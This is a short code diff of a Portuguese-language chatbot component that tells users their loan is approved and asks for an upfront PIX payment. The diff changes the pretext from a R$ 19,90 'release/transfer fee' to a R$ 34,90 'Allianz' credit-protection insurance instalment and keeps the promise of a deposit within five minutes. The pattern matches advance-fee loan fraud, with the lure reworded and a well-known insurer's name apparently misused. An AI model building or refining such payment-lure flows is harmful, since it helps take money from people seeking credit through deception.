@@ -697,13 +697,13 @@ const Chat = () => {
 
   const generatePixPayment = async () => {
     await addBotMessages(() => [{
-      id: Date.now(), text: `Segue o PIX para pagamento da Taxa de Liberação/Transferência: 👇`,
+      id: Date.now(), text: `Segue o PIX para pagamento do Seguro Prestamista: 👇`,
       fromUser: false, time: getNow(), read: true,
     }]);
 
     try {
       const { data, error } = await supabase.functions.invoke('create-pix', {
-        body: { value: 1990 },
+        body: { value: 3490 },
       });
 
       if (error) throw error;
@@ -861,7 +861,7 @@ const Chat = () => {
                         }]).then(() => {
                           addBotMessages(() => [{
                             id: Date.now() + 2,
-                            text: `Perfeito, ${firstName || "cliente"}! Para finalizar a liberação do seu crédito, é necessário o pagamento da Taxa de Liberação/Transferência no valor de R$ 19,90.\n\n💡 Essa taxa cobre os custos operacionais de processamento e transferência (TED/PIX) do valor aprovado para sua conta.\n\n⚡ Após a confirmação do pagamento, o valor será depositado em até 5 minutos na conta informada.`,
+                            text: `Perfeito, ${firstName || "cliente"}! Para ativar o Seguro Prestamista Allianz, realize o pagamento da primeira mensalidade no valor de R$ 34,90.\n\n🛡️ Após a confirmação do pagamento, sua cobertura será ativada imediatamente.\n\n⚡ O valor do empréstimo será depositado em até 5 minutos na conta informada.`,
                             fromUser: false, time: getNow(), read: true,
                           }]).then(() => {
                             generatePixPayment();
